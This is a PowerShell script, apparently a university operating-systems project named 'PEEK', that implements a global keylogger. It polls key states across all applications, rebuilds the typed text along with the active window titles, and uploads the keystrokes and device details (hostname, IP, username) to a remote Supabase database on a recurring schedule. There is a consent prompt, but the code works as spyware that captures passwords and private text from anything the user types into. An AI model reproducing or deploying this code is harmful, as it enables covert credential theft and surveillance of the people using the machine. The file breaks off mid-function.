# Enhanced Combined Educational Activity and Keystroke Monitor
# University Operating Systems Project - Supabase Integration

param(
    [switch]$StartMonitoring,
    [switch]$InstallService,
    [switch]$CreateDashboard,
    [string]$Mode = "Interactive"
)

# Load configuration from config.ps1
$configPath = "$PSScriptRoot\config.ps1"
if (Test-Path $configPath) {
    . $configPath
    Write-Host "[INFO] Loaded configuration from config.ps1" -ForegroundColor Green
} else {
    Write-Host "[WARNING] config.ps1 not found, using default values" -ForegroundColor Yellow
}

# Configuration
$Global:Config = @{
    LogsFolder = "$PSScriptRoot\Logs"
    WebDashboardPath = "$PSScriptRoot"
    SupabaseUrl = $env:SUPABASE_URL
    SupabaseKey = $env:SUPABASE_API_KEY
    MaxRecordingDuration = 300
    AutoOpenDashboard = $true
}

# Global variables
$Global:DeviceInfoJob = $null
$Global:IsRecording = $false
$Global:KeystrokeBuffer = ""
$Global:RecordingStartTime = $null
$Global:RecordingWindow = ""
$Global:Running = $true
$Global:ActivityMonitorJob = $null

# Global variables for keystroke hooking
$Global:KeystrokeHook = $null
$Global:KeystrokeJob = $null


# Initialize folder structure
function Initialize-Folders {
    if (-not (Test-Path $Global:Config.LogsFolder)) {
        New-Item -ItemType Directory -Path $Global:Config.LogsFolder -Force | Out-Null
        New-Item -ItemType Directory -Path "$($Global:Config.LogsFolder)\Activity" -Force | Out-Null
        New-Item -ItemType Directory -Path "$($Global:Config.LogsFolder)\Keystrokes" -Force | Out-Null
        Write-Host "[INFO] Created logs folder structure" -ForegroundColor Green
    }
}

# Supabase API functions
function Send-ToSupabase {
    param(
        [string]$Table,
        [hashtable]$Data
    )
    
    try {
        $headers = @{
            "apikey" = $Global:Config.SupabaseKey
            "Authorization" = "Bearer $($Global:Config.SupabaseKey)"
            "Content-Type" = "application/json"
        }
        
        $url = "$($Global:Config.SupabaseUrl)/rest/v1/$Table"
        $jsonData = $Data | ConvertTo-Json -Compress
        
        $response = Invoke-RestMethod -Uri $url -Method POST -Headers $headers -Body $jsonData
        Write-Host "[SUPABASE] Data sent to $Table table" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[SUPABASE ERROR] Failed to send to $Table`: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Enhanced keystroke logging functions
function Show-EducationalDisclaimer {
    Clear-Host
    Write-Host "=========================================" -ForegroundColor Yellow
    Write-Host "           PEEK             " -ForegroundColor DarkRed
    Write-Host "   ENHANCED ACTIVITY MONITOR" -ForegroundColor Yellow
    Write-Host "   Bahria University OS Project" -ForegroundColor Yellow
    Write-Host "=========================================" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "This tool demonstrates:" -ForegroundColor Green
    Write-Host "- System activity monitoring" -ForegroundColor White
    Write-Host "- Keystroke capture with consent" -ForegroundColor White
    Write-Host "- Database integration (Supabase)" -ForegroundColor White
    Write-Host "- Real-time web dashboard" -ForegroundColor White
    Write-Host "- Local file logging with organization" -ForegroundColor White
    Write-Host ""
    Write-Host "ENHANCED FEATURES:" -ForegroundColor Cyan
    Write-Host "- Automatic dashboard opening" -ForegroundColor White
    Write-Host "- Organized log folder structure" -ForegroundColor White
    Write-Host "- Real-time Supabase sync" -ForegroundColor White
    Write-Host "- Combined activity + keystroke monitoring" -ForegroundColor White
    Write-Host ""
    
    do {
        $consent = Read-Host "Do you consent to comprehensive monitoring for this OS Project? (yes/no)"
    } while ($consent -notin @("yes", "no", "y", "n"))
    
    if ($consent -notin @("yes", "y")) {
        Write-Host "Monitoring cancelled." -ForegroundColor Red
        exit
    }
    Write-Host ""
}

function Get-CurrentContext {
    try {
        $currentProcess = Get-Process -Id $PID
        return @{
            ProcessName = $currentProcess.ProcessName
            WindowTitle = "PowerShell Console"
            StartTime = Get-Date
            MachineName = $env:COMPUTERNAME
            UserName = $env:USERNAME
        }
    }
    catch {
        return @{
            ProcessName = "PowerShell"
            WindowTitle = "PowerShell Console"
            StartTime = Get-Date
            MachineName = $env:COMPUTERNAME
            UserName = $env:USERNAME
        }
    }
}

function Show-RecordingStatus {
    $status = if ($Global:IsRecording) { "[KEYSTROKE RECORDING ACTIVE]" } else { "[Ready to Record]" }
    $color = if ($Global:IsRecording) { "Red" } else { "Green" }
    
    Write-Host "`n=== STATUS: $status ===" -ForegroundColor $color
    
    if ($Global:IsRecording) {
        $elapsed = (Get-Date) - $Global:RecordingStartTime
        Write-Host "Recording Time: $([math]::Round($elapsed.TotalSeconds, 1)) seconds" -ForegroundColor Yellow
        Write-Host "Characters Captured: $($Global:KeystrokeBuffer.Length)" -ForegroundColor Yellow
    }
    
    $activityStatus = if ($Global:ActivityMonitorJob -and $Global:ActivityMonitorJob.State -eq "Running") { "ACTIVE" } else { "STOPPED" }
    Write-Host "Activity Monitor: $activityStatus" -ForegroundColor $(if ($activityStatus -eq "ACTIVE") { "Green" } else { "Red" })
}

# Enhanced keystroke capture with global hook
function Start-GlobalKeystrokeCapture {
    param(
        [string]$LogPath = "$($Global:Config.LogsFolder)\Keystrokes"
    )
    
    Write-Host "[INFO] Starting global keystroke capture..." -ForegroundColor Green
    
    $Global:KeystrokeJob = Start-Job -ScriptBlock {
        param($logPath, $supabaseUrl, $supabaseKey)
        
        # Function to send keystroke data to Supabase
        function Send-KeystrokeToSupabase {
            param($KeystrokeData)
            try {
                $headers = @{
                    "apikey" = $supabaseKey
                    "Authorization" = "Bearer $supabaseKey"
                    "Content-Type" = "application/json"
                }
                $url = "$supabaseUrl/rest/v1/key_logs"
                $jsonData = $KeystrokeData | ConvertTo-Json -Compress
                $response = Invoke-RestMethod -Uri $url -Method POST -Headers $headers -Body $jsonData
                return $true
            }
            catch {
                Write-Output "[SUPABASE ERROR] Failed to send keystroke data: $($_.Exception.Message)"
                return $false
            }
        }
        
        # Enhanced keystroke monitoring with real-time processing
        Write-Output "[GLOBAL KEYLOGGER] Starting global keystroke capture..."
        Write-Output "[GLOBAL KEYLOGGER] Logs will be saved to: $logPath"
        
        # Ensure log directory exists
        if (-not (Test-Path $logPath)) {
            New-Item -ItemType Directory -Path $logPath -Force | Out-Null
        }
        
        # Buffer for batch processing
        $keystrokeBuffer = @()
        $sessionBuffer = ""
        $lastSaveTime = Get-Date
        $deviceId = "$env:COMPUTERNAME-$env:USERNAME"
        
        # Alternative method using .NET classes for better compatibility
        Add-Type -AssemblyName System.Windows.Forms
        
        # Simple polling method as fallback
        $lastClipboard = ""
        $keystrokeCount = 0
        
        Write-Output "[GLOBAL KEYLOGGER] Monitoring started. Press Ctrl+C in main window to stop."
        
        while ($true) {
            try {
                # Get current active window
                Add-Type @"
                    using System;
                    using System.Runtime.InteropServices;
                    using System.Text;
                    public class WindowInfo {
                        [DllImport("user32.dll")]
                        public static extern IntPtr GetForegroundWindow();
                        [DllImport("user32.dll")]
                        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
                        [DllImport("user32.dll")]
                        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
                    }
"@
                
                $hwnd = [WindowInfo]::GetForegroundWindow()
                $title = New-Object System.Text.StringBuilder(256)
                [WindowInfo]::GetWindowText($hwnd, $title, 256) | Out-Null
                
                $processId = [uint32]0
                [WindowInfo]::GetWindowThreadProcessId($hwnd, [ref]$processId) | Out-Null
                
                $currentWindow = "Unknown"
                if ($processId -gt 0) {
                    try {
                        $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
                        if ($process) {
                            $currentWindow = "$($process.ProcessName) - $($title.ToString())"
                        }
                    } catch { }
                }
                
                # Enhanced keystroke detection using clipboard monitoring and key state checking
                $keyStates = @{}
                
                # Check common keys (expanded set)
                $keysToCheck = @{
                    # Letters
                    65 = "A"; 66 = "B"; 67 = "C"; 68 = "D"; 69 = "E"; 70 = "F"; 71 = "G"; 72 = "H"; 73 = "I"; 74 = "J";
                    75 = "K"; 76 = "L"; 77 = "M"; 78 = "N"; 79 = "O"; 80 = "P"; 81 = "Q"; 82 = "R"; 83 = "S"; 84 = "T";
                    85 = "U"; 86 = "V"; 87 = "W"; 88 = "X"; 89 = "Y"; 90 = "Z";
                    # Numbers
                    48 = "0"; 49 = "1"; 50 = "2"; 51 = "3"; 52 = "4"; 53 = "5"; 54 = "6"; 55 = "7"; 56 = "8"; 57 = "9";
                    # Common keys
                    32 = "SPACE"; 13 = "ENTER"; 8 = "BACKSPACE"; 9 = "TAB"; 27 = "ESC";
                    # Punctuation
                    186 = ";"; 187 = "="; 188 = ","; 189 = "-"; 190 = "."; 191 = "/";
                    219 = "["; 220 = "BACKSLASH"; 221 = "]"; 222 = "QUOTE";
                    # Function keys
                    112 = "F1"; 113 = "F2"; 114 = "F3"; 115 = "F4"; 116 = "F5"; 117 = "F6";
                    118 = "F7"; 119 = "F8"; 120 = "F9"; 121 = "F10"; 122 = "F11"; 123 = "F12";
                    # Arrow keys
                    37 = "LEFT"; 38 = "UP"; 39 = "RIGHT"; 40 = "DOWN";
                    # Navigation keys
                    45 = "INSERT"; 46 = "DELETE"; 36 = "HOME"; 35 = "END"; 33 = "PGUP"; 34 = "PGDN"
                }
                
                Add-Type @"
                    using System;
                    using System.Runtime.InteropServices;
                    public class KeyState {
                        [DllImport("user32.dll")]
                        public static extern short GetAsyncKeyState(int vKey);
                    }
"@
                
                # Check for key presses
                foreach ($keyCode in $keysToCheck.Keys) {
                    $keyState = [KeyState]::GetAsyncKeyState($keyCode)
                    if ($keyState -band 0x8000) {  # Key is currently pressed
                        if (-not $keyStates.ContainsKey($keyCode) -or -not $keyStates[$keyCode]) {
                            $keyName = $keysToCheck[$keyCode]
                            $timestamp = Get-Date
                            
                            # Check modifier keys
                            $shiftPressed = [KeyState]::GetAsyncKeyState(16) -band 0x8000  # VK_SHIFT
                            $ctrlPressed = [KeyState]::GetAsyncKeyState(17) -band 0x8000   # VK_CONTROL
                            $altPressed = [KeyState]::GetAsyncKeyState(18) -band 0x8000    # VK_MENU (Alt)
                            $capsLockOn = [KeyState]::GetAsyncKeyState(20) -band 0x0001    # VK_CAPITAL (Caps Lock toggle state)
                            
                            # Add to session buffer with proper case handling
                            if ($keyName -eq "SPACE") {
                                $sessionBuffer += " "
                            } 
                            elseif ($keyName -eq "ENTER") {
                                $sessionBuffer += "`n"  # Use actual newline instead of [ENTER]
                            } 
                            elseif ($keyName -eq "BACKSPACE") {
                                # Actually remove last character if possible
                                if ($sessionBuffer.Length -gt 0) {
                                    $sessionBuffer = $sessionBuffer.Substring(0, $sessionBuffer.Length - 1)
                                }
                            } 
                            elseif ($keyName -eq "TAB") {
                                $sessionBuffer += "`t"  # Use actual tab
                            } 
                            elseif ($keyName -match "^[A-Z]$") {
                                # Letter keys - handle case properly
                                $shouldBeUppercase = ($shiftPressed -and -not $capsLockOn) -or (-not $shiftPressed -and $capsLockOn)
                                if ($shouldBeUppercase) {
                                    $sessionBuffer += $keyName.ToUpper()
                                } else {
                                    $sessionBuffer += $keyName.ToLower()
                                }
                            }
                            elseif ($keyName -match "^[0-9]$") {
                                # Number keys - handle shift symbols
                                if ($shiftPressed) {
                                    $shiftSymbols = @{
                                        "1" = "!"; "2" = "@"; "3" = "#"; "4" = "$"; "5" = "%"
                                        "6" = "^"; "7" = "&"; "8" = "*"; "9" = "("; "0" = ")"
                                    }
                                    if ($shiftSymbols.ContainsKey($keyName)) {
                                        $sessionBuffer += $shiftSymbols[$keyName]
                                    } else {
                                        $sessionBuffer += $keyName
                                    }
                                } else {
                                    $sessionBuffer += $keyName
                                }
                            }
                            elseif ($keyName -eq ";") {
                                $sessionBuffer += if ($shiftPressed) { ":" } else { ";" }
                            }
                            elseif ($keyName -eq "=") {
                                $sessionBuffer += if ($shiftPressed) { "+" } else { "=" }
                            }
                            elseif ($keyName -eq ",") {
                                $sessionBuffer += if ($shiftPressed) { "<" } else { "," }
                            }
                            elseif ($keyName -eq "-") {
                                $sessionBuffer += if ($shiftPressed) { "_" } else { "-" }
                            }
                            elseif ($keyName -eq ".") {
                                $sessionBuffer += if ($shiftPressed) { ">" } else { "." }
                            }
                            elseif ($keyName -eq "/") {
                                $sessionBuffer += if ($shiftPressed) { "?" } else { "/" }
                            }
                            elseif ($keyName -eq "[") {
                                $sessionBuffer += if ($shiftPressed) { "{" } else { "[" }
                            }
                            elseif ($keyName -eq "BACKSLASH") {
                                $sessionBuffer += if ($shiftPressed) { "|" } else { "\" }
                            }
                            elseif ($keyName -eq "]") {
                                $sessionBuffer += if ($shiftPressed) { "}" } else { "]" }
                            }
                            elseif ($keyName -eq "QUOTE") {
                                $sessionBuffer += if ($shiftPressed) { '"' } else { "'" }
                            }
                            elseif ($keyName -in @("F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12")) {
                                $sessionBuffer += "[$keyName]"
                            }
                            elseif ($keyName -in @("LEFT", "UP", "RIGHT", "DOWN", "INSERT", "DELETE", "HOME", "END", "PGUP", "PGDN", "ESC")) {
                                $sessionBuffer += "[$keyName]"
                            }
                            else {
                                # Fallback for any other keys
                                $sessionBuffer += $keyName
                            }
                            
                            $keystrokeData = @{
                                device_id = $deviceId
                                key_pressed = $keyName
                                key_code = $keyCode
                                window_title = $currentWindow
                                timestamp = $timestamp.ToString("o")
                            }
                            
                            # Log locally
                            $logEntry = "[$($timestamp.ToString('yyyy-MM-dd HH:mm:ss.fff'))] [$currentWindow] Key: $keyName (Code: $keyCode)"
                            Write-Output $logEntry
                            
                            # Add to buffer
                            $keystrokeBuffer += $keystrokeData
                            $keystrokeCount++
                            
                            # Save buffer periodically
                            if ($keystrokeBuffer.Count -ge 10 -or ((Get-Date) - $lastSaveTime).TotalSeconds -ge 30) {
                                # Save to file
                                $timestamp_file = Get-Date -Format "yyyyMMdd_HHmmss"
                                $logFile = "$logPath\global_keystrokes_$timestamp_file.json"
                                $keystrokeBuffer | ConvertTo-Json | Out-File -FilePath $logFile -Encoding UTF8
                                
                                # Save session buffer
                                $sessionFile = "$logPath\session_buffer_$timestamp_file.txt"
                                $bufferContent = "=== SESSION BUFFER (Length: $($sessionBuffer.Length)) ===" + "`n" + $sessionBuffer + "`n" + "=== END BUFFER ==="
                                $bufferContent | Out-File -FilePath $sessionFile -Encoding UTF8
                                
                                # Send to Supabase (batch)
                                foreach ($keystroke in $keystrokeBuffer) {
                                    Send-KeystrokeToSupabase -KeystrokeData $keystroke | Out-Null
                                }
                                
                                Write-Output "[GLOBAL KEYLOGGER] Saved $($keystrokeBuffer.Count) keystrokes to $logFile"
                                Write-Output "[SESSION] Buffer saved: $($sessionBuffer.Length) characters"
                                $keystrokeBuffer = @()
                                $lastSaveTime = Get-Date
                            }
                            
                            $keyStates[$keyCode] = $true
                        }
                    } else {
                        $keyStates[$keyCode] = $false
                    }
                }
                
                Start-Sleep -Milliseconds 50  # Check every 50ms for responsive key detection
                
            }
            catch {
                Write-Output "[GLOBAL KEYLOGGER ERROR] $($_.Exception.Message)"
                Start-Sleep -Seconds 5
            }
        }
        
    } -ArgumentList $LogPath, $Global:Config.SupabaseUrl, $Global:Config.SupabaseKey
    
    Write-Host "[SUCCESS] Global keystroke capture started in background" -ForegroundColor Green
    
    # Monitor job output
    Start-Job -ScriptBlock {
        param($job)
        while ($job.State -eq "Running") {
            $output = Receive-Job -Job $job
            if ($output) {
                Write-Host "[KEYLOGGER] $output" -ForegroundColor Yellow
            }
            Start-Sleep -Seconds 1
        }
    } -ArgumentList $Global:KeystrokeJob | Out-Null
}


function Stop-GlobalKeystrokeCapture {
    if ($Global:KeystrokeJob) {
        # Get the final session buffer before stopping
        $finalOutput = Receive-Job -Job $Global:KeystrokeJob
        
        Stop-Job -Job $Global:KeystrokeJob -ErrorAction SilentlyContinue
        Remove-Job -Job $Global:KeystrokeJob -ErrorAction SilentlyContinue
        $Global:KeystrokeJob = $null
        Write-Host "[INFO] Global keystroke capture stopped" -ForegroundColor Green
        
        return $finalOutput
    }
}

function Start-KeystrokeRecording {
    if ($Global:IsRecording) {
        Write-Host "Keystroke recording is already active." -ForegroundColor Yellow
        return
    }
    
    $Global:IsRecording = $true
    $Global:RecordingStartTime = Get-Date
    $Global:KeystrokeBuffer = ""
    $Global:SessionString = ""  # Add this for session tracking
    
    # Get current context safely
    try {
        $context = Get-CurrentContext
        $Global:RecordingWindow = "$($context.ProcessName) - $($context.WindowTitle)"
    }
    catch {
        $Global:RecordingWindow = "Unknown Window"
    }
    
    Write-Host ""
    Write-Host "[GLOBAL KEYSTROKE RECORDING STARTED]" -ForegroundColor Red -BackgroundColor Yellow
    Write-Host "Mode: SESSION STRING CAPTURE" -ForegroundColor Cyan
    Write-Host "Device: $env:COMPUTERNAME-$env:USERNAME" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Now capturing ALL keystrokes system-wide into session string!" -ForegroundColor Red
    Write-Host "Special keys will be formatted as: [ENTER], [BACKSPACE], [TAB], etc." -ForegroundColor White
    Write-Host ""
    Write-Host "Commands:" -ForegroundColor Green
    Write-Host "- Type 'STOP' in this PowerShell window to end recording" -ForegroundColor White
    Write-Host "- Type 'STATUS' to see current recording status" -ForegroundColor White
    Write-Host "- Type 'QUIT' to exit the program completely" -ForegroundColor White
    Write-Host ""
    
    # Start global keystroke capture
    Start-GlobalKeystrokeCapture
    
    Write-Host "Global keystroke recording is now ACTIVE!" -ForegroundColor Green
}

function Stop-KeystrokeRecording {
    if (-not $Global:IsRecording) {
        Write-Host "No active keystroke recording session." -ForegroundColor Yellow
        return
    }
    
    $Global:IsRecording = $false
    $endTime = Get-Date
    
    Write-Host ""
    Write-Host "[STOPPING GLOBAL KEYSTROKE RECORDING...]" -ForegroundColor Yellow
    
    # Stop global capture and get final session data
    $finalOutput = Stop-GlobalKeystrokeCapture
    
    # Try to extract session string from the most recent buffer file
    $keystrokesFolder = "$($Global:Config.LogsFolder)\Keystrokes"
    if (Test-Path $keystrokesFolder) {
        $latestBufferFile = Get-ChildItem -Path $keystrokesFolder -Filter "session_buffer_*.txt" -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1
        
        $sessionString = ""
        if ($latestBufferFile) {
            try {
                $bufferContent = Get-Content -Path $latestBufferFile.FullName -Raw -ErrorAction SilentlyContinue
                # Extract content between markers
                if ($bufferContent -match "=== SESSION BUFFER.*?===\s*\n(.*?)\n=== END BUFFER ===") {
                    $sessionString = $matches[1]
                }
                elseif ($bufferContent -match "=== SESSION BUFFER.*?===\s*\r?\n(.*?)\r?\n=== END BUFFER ===") {
                    $sessionString = $matches[1]
                }
            }
            catch {
                Write-Host "[WARNING] Could not read session buffer: $($_.Exception.Message)" -ForegroundColor Yellow
            }
        }
    }
    else {
        $sessionString = ""
        Write-Host "[WARNING] Keystrokes folder not found" -ForegroundColor Yellow
    }
    
    Write-Host ""
    Write-Host "[GLOBAL KEYSTROKE RECORDING STOPPED]" -ForegroundColor Green -BackgroundColor Black
    
    $duration = ($endTime - $Global:RecordingStartTime).TotalSeconds
    Write-Host "Recording duration: $([math]::Round($duration, 1)) seconds" -ForegroundColor Cyan
    Write-Host "Session string length: $($sessionString.Length) characters" -ForegroundColor Cyan
    
    # Save session to file and database
    if ($sessionString.Length -gt 0) {
        $saveSuccess = Save-KeystrokesToFile -Keystrokes $sessionString -WindowTitle $Global:RecordingWindow -StartTime $Global:RecordingStartTime -EndTime $endTime
        
        if ($saveSuccess) {
            # Send to database
            Write-Host "[INFO] Sending session to database..." -ForegroundColor Cyan
            Send-KeystrokesToSupabase -Keystrokes $sessionString -WindowTitle $Global:RecordingWindow -StartTime $Global:RecordingStartTime -EndTime $endTime
        }
        
        Write-Host ""
        Write-Host "SESSION PREVIEW (first 200 chars):" -ForegroundColor Green
        $preview = if ($sessionString.Length -gt 200) { $sessionString.Substring(0, 200) + "..." } else { $sessionString }
        Write-Host $preview -ForegroundColor White
    } 
    else {
        Write-Host "[WARNING] No session string captured. Check if keylogger was working properly." -ForegroundColor Yellow
    }
}

function Save-KeystrokesToFile {
    param(
        [string]$Keystrokes,
        [string]$WindowTitle,
        [datetime]$StartTime,
        [datetime]$EndTime
    )
    
    try {
        $deviceId = "$env:COMPUTERNAME-$env:USERNAME"
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        
        # Create detailed log entry
        $keystrokeLog = @{
            device_id = $deviceId
            keystrokes = $Keystrokes
            window_title = $WindowTitle
            session_start = $StartTime.ToString("yyyy-MM-dd HH:mm:ss")
            session_end = $EndTime.ToString("yyyy-MM-dd HH:mm:ss")
            session_duration_seconds = ($EndTime - $StartTime).TotalSeconds
            keystroke_count = $Keystrokes.Length
            line_count = ($Keystrokes -split "`n").Count
            timestamp = $StartTime.ToString("o")
        }
        
        # Save to organized folder structure
        $keystrokesFolder = "$($Global:Config.LogsFolder)\Keystrokes"
        if (-not (Test-Path $keystrokesFolder)) {
            New-Item -ItemType Directory -Path $keystrokesFolder -Force | Out-Null
        }
        
        $logFileName = "$keystrokesFolder\keystroke_session_$timestamp.json"
        $keystrokeLog | ConvertTo-Json -Depth 3 | Out-File -FilePath $logFileName -Encoding UTF8
        Write-Host "[SUCCESS] Keystroke session saved to: $logFileName" -ForegroundColor Green
        
        # Save readable text version
        $textFileName = "$keystrokesFolder\keystroke_session_$timestamp.txt"
        $textContent = @"
=== KEYSTROKE SESSION LOG ===
Device: $deviceId
Context: $WindowTitle
Start Time: $($StartTime.ToString("yyyy-MM-dd HH:mm:ss"))
End Time: $($EndTime.ToString("yyyy-MM-dd HH:mm:ss"))
Duration: $([math]::Round(($EndTime - $StartTime).TotalSeconds, 1)) seconds
Character Count: $($Keystrokes.Length)
Line Count: $(($Keystrokes -split "`n").Count)

=== SESSION STRING ===
$Keystrokes
=== END OF SESSION ===
"@
        $textContent | Out-File -FilePath $textFileName -Encoding UTF8
        Write-Host "[SUCCESS] Readable session log saved to: $textFileName" -ForegroundColor Green
        
        return $true
    }
    catch {
        Write-Host "[ERROR] Error saving keystrokes: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Send-KeystrokesToSupabase {
    param(
        [string]$Keystrokes,
        [string]$WindowTitle,
        [datetime]$StartTime,
        [datetime]$EndTime
    )
    
    try {
        $keystrokeData = @{
            device_id = "$env:COMPUTERNAME-$env:USERNAME"
            keystrokes = $Keystrokes
            window_title = $WindowTitle
            timestamp = $StartTime.ToString("o")
        }
        
        $result = Send-ToSupabase -Table "key_logs" -Data $keystrokeData
        
        if ($result) {
            Write-Host "[SUCCESS] Session string sent to database successfully!" -ForegroundColor Green
            Write-Host "- Session length: $($Keystrokes.Length) characters" -ForegroundColor Cyan
            Write-Host "- Window context: $WindowTitle" -ForegroundColor Cyan
        } 
        else {
            Write-Host "[ERROR] Failed to send session to database" -ForegroundColor Red
        }
        
        return $result
    }
    catch {
        Write-Host "[ERROR] Database error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Device Info Updater
function Get-DeviceInfo {
    try {
        $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
        $operatingSystem = Get-WmiObject -Class Win32_OperatingSystem
        $processor = Get-WmiObject -Class Win32_Processor | Select-Object -First 1
        $memory = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
        $disk = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | Measure-Object -Property Size -Sum
        
        # Get IP address using WMI (more compatible)
        $ipAddress = $null
        try {
            $networkAdapters = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | 
                              Where-Object { $_.IPEnabled -eq $true -and $_.IPAddress -ne $null }
            
            foreach ($adapter in $networkAdapters) {
                foreach ($ip in $adapter.IPAddress) {
                    if ($ip -match "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$" -and $ip -ne "127.0.0.1") {
                        $ipAddress = $ip
                        break
                    }
                }
                if ($ipAddress) { break }
            }
        }
        catch {
            # Fallback method
            try {
                $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
            }
            catch {
                $ipAddress = "Unknown"
            }
        }
        
        $deviceInfo = @{
            id = "$env:COMPUTERNAME-$env:USERNAME"
            hostname = $env:COMPUTERNAME
            ip_address = $ipAddress -or "Unknown"
            os = "$($operatingSystem.Caption) $($operatingSystem.Version)"
            processor = $processor.Name.Trim()
            memory_gb = [math]::Round(($memory.Sum / 1GB), 2)
            disk_space_gb = [math]::Round(($disk.Sum / 1GB), 2)
            username = $env:USERNAME
            domain = $env:USERDOMAIN
            last_seen = (Get-Date).ToString("o")
            service_version = "Enhanced Monitor v2.0"
            created_at = (Get-Date).ToString("o")
            updated_at = (Get-Date).ToString("o")
        }
        
        return $deviceInfo
    }
    catch {
        Write-Host "[ERROR] Failed to get device info: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

function Send-DeviceInfoToSupabase {
    try {
        $deviceInfo = Get-DeviceInfo
        if (-not $deviceInfo) {
            Write-Host "[ERROR] Could not retrieve device information" -ForegroundColor Red
            return $false
        }
        
        $headers = @{
            "apikey" = $Global:Config.SupabaseKey
            "Authorization" = "Bearer $($Global:Config.SupabaseKey)"
            "Content-Type" = "application/json"
            "Prefer" = "resolution=merge-duplicates"
        }
        
        $url = "$($Global:Config.SupabaseUrl)/rest/v1/devices"
        $jsonData = $deviceInfo | ConvertTo-Json -Compress
        
        # Use UPSERT to update existing device or create new one
        $response = Invoke-RestMethod -Uri $url -Method POST -Headers $headers -Body $jsonData
        
        Write-Host "[DEVICE INFO] Successfully updated device information in database" -ForegroundColor Green
        Write-Host "- Device ID: $($deviceInfo.id)" -ForegroundColor Cyan
        Write-Host "- Hostname: $($deviceInfo.hostname)" -ForegroundColor Cyan
        Write-Host "- IP: $($deviceInfo.ip_address)" -ForegroundColor Cyan
        Write-Host "- OS: $($deviceInfo.os)" -ForegroundColor Cyan
        Write-Host "- RAM: $($deviceInfo.memory_gb) GB" -ForegroundColor Cyan
        
        return $true
    }
    catch {
        Write-Host "[DEVICE ERROR] Failed to send device info: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Start-DeviceInfoUpdater {
    Write-Host "[INFO] Starting device info updater..." -ForegroundColor Green
    
    # Send initial device info
    Send-DeviceInfoToSupabase
    
    # Start background job to update device info periodically
    $Global:DeviceInfoJob = Start-Job -ScriptBlock {
        param($supabaseUrl, $supabaseKey)
        
        function Get-DeviceInfoBackground {
            try {
                $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
                $operatingSystem = Get-WmiObject -Class Win32_OperatingSystem
                $processor = Get-WmiObject -Class Win32_Processor | Select-Object -First 1
                $memory = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
                $disk = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | Measure-Object -Property Size -Sum
                
                # Get IP address
                $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi*", "Ethernet*" -ErrorAction SilentlyContinue | 
                             Where-Object { $_.IPAddress -ne "127.0.0.1" } | 
                             Select-Object -First 1).IPAddress
                
                if (-not $ipAddress) {
                    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | 
                                 Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -eq "Dhcp" } | 
                                 Select-Object -First 1).IPAddress
                }
                
                return @{
                    id = "$env:COMPUTERNAME-$env:USERNAME"
                    hostname = $env:COMPUTERNAME
                    ip_address = $ipAddress -or "Unknown"
                    os = "$($operatingSystem.Caption) $($operatingSystem.Version)"
                    processor = $processor.Name.Trim()
                    memory_gb = [math]::Round(($memory.Sum / 1GB), 2)
                    disk_space_gb = [math]::Round(($disk.Sum / 1GB), 2)
                    username = $env:USERNAME
                    domain = $env:USERDOMAIN
                    last_seen = (Get-Date).ToString("o")
                    service_version = "Enhanced Monitor v2.0"
                    updated_at = (Get-Date).ToString("o")
                }
            }
            catch {
                Write-Output "[DEVICE ERROR] Failed to get device info in background: $($_.Exception.Message)"
                return $null
            }
        }
        
        function Send-DeviceInfoBackground {
            param($DeviceInfo)
            try {
                $headers = @{
                    "apikey" = $supabaseKey
                    "Authorization" = "Bearer $supabaseKey"
                    "Content-Type" = "application/json"
                    "Prefer" = "resolution=merge-duplicates"
                }
                
                $url = "$supabaseUrl/rest/v1/devices"
                $jsonData = $DeviceInfo | ConvertTo-Json -Compress
                
                $response = Invoke-RestMethod -Uri $url -Method POST -Headers $headers -Body $jsonData
                Write-Output "[DEVICE UPDATER] Device info updated successfully"
                return $true
            }
            catch {
                Write-Output "[DEVICE UPDATER ERROR] Failed to update device info: $($_.Exception.Message)"
                return $false
            }
        }
        
        Write-Output "[DEVICE UPDATER] Starting periodic device info updates (every 5 minutes)"
        
        while ($true) {
            try {
                Start-Sleep -Seconds 300  # Update every 5 minutes
                
                $deviceInfo = Get-DeviceInfoBackground
                if ($deviceInfo) {
                    $success = Send-DeviceInfoBackground -DeviceInfo $deviceInfo
                    if ($success) {
                        Write-Output "[DEVICE UPDATER] Heartbeat sent - Last seen updated"
                    }
                }
            }
            catch {
                Write-Output "[DEVICE UPDATER ERROR] Error in update loop: $($_.Exception.Message)"
                Start-Sleep -Seconds 60  # Wait 1 minute before retrying
            }
        }
    } -ArgumentList $Global:Config.SupabaseUrl, $Global:Config.SupabaseKey
    
    Write-Host "[SUCCESS] Device info updater started - will update every 5 minutes" -ForegroundColor Green
}

function Stop-DeviceInfoUpdater {
    if ($Global:DeviceInfoJob) {
        Stop-Job -Job $Global:DeviceInfoJob -ErrorAction SilentlyContinue
        Remove-Job -Job $Global:DeviceInfoJob -ErrorAction SilentlyContinue
        $Global:DeviceInfoJob = $null
        Write-Host "[INFO] Device info updater stopped" -ForegroundColor Green
    }
}


# Enhanced Activity Monitor
function Start-ActivityMonitor {
